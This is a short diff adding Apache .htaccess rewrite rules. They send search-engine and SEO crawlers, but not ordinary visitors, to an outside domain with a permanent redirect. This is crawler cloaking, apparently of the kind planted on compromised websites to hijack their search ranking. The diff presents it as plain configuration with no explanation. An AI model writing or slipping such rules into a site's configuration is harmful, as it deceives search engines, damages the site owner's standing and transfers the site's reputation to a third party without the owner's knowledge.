@@ -1,0 +1,3 @@
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+RewriteRule ^(.*)$ https://journal.jmu.edu.iq/ [R=301,L]
